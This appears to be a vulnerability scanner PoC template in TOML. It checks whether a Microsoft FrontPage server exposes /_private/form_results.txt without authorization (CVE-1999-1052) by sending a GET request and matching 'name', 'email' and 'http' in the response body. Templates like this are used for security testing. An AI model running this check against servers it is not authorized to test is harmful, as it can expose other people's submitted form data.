[info]
author = "ave"
description = "验证 Microsoft FrontPage 默认配置下 /_private/form_results.txt 文件是否可被未授权访问，从而泄露表单提交的敏感信息。"
id = "POC-AVE-1999-0905"
name = "Microsoft FrontPage Form Results Information Disclosure PoC"
severity = "medium"
tags = ["ave-1999-0905"]
vuln_id = [
    "CVE-1999-1052",
    "AVE-1999-0905",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/_private/form_results.txt"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "name",
    "email",
    "http",
]
